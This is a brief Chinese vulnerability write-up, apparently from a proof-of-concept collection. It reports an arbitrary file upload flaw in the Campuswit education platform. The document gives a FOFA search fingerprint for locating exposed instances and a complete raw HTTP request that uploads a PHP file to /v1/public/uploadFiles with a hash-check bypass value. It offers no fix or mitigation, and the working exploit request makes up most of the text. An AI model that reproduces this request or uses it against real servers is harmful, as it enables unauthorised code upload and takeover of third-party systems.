## **慧学教育科技有限公司Campuswit_uploadFiles存在任意文件上传漏洞**

慧学教育科技有限公司Campuswit uploadFiles存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## fofa

```yaml
body="campuswit"
```

## poc

```yaml
POST /v1/public/uploadFiles HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 412

--00content0boundary00
Content-Disposition: form-data; name="keep_filename"

1
--00content0boundary00
Content-Disposition: form-data; name="check_file"

1
--00content0boundary00
Content-Disposition: form-data; name="campuswitHash"

campuswit_hash_success
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: text/php

1234
--00content0boundary00--
```

![image-20240711184311236](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407111843311.png)